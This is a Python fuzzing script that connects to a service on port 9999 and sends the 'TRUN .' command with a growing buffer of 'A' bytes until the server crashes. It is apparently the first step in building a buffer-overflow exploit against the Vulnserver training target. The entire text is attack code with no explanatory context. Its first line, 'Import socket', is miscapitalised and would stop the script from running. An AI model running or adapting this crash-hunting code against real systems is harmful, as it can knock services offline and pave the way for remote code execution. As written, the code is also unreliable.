Import socket
from time import sleep

# Define the target server IP and Port
target_ip = '192.168.1.136'
target_port = 9999

# Fuzzing variables
text = b'A'
buffer = text * 100
buffer_increment = 300

# Command
command = b'TRUN'
command_magic = b' .'

try:
        while True:
                # Create a socket object and connect to the server
                print('Exploit> Connect to target')
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))

                # Receive the banner or welcome message from the server
                banner = s.recv(1024).decode('utf-8')
                print(f'Server> {banner}')

                # Fuzzing
                print(f'Exploit> Fuzzing {command} command with {len(buffer)} bytes')
                fuzzing = command + command_magic + buffer
                s.send(fuzzing)

                # Receive the response
                response = s.recv(1024).decode('utf-8')
                print(f'Server> {response}')
                print('--------------------------------------')

                # Increment the buffer size and sleep to avoid overwhelming the server
                buffer += text * buffer_increment
                sleep(2)

except Exception as e:
        # Exception handling
        print(f'An error occurred: {str(e)}')
        print(f'Fuzzing crashed at buffer size: {len(buffer)} bytes')

finally:
        # Close the connection
        s.close()
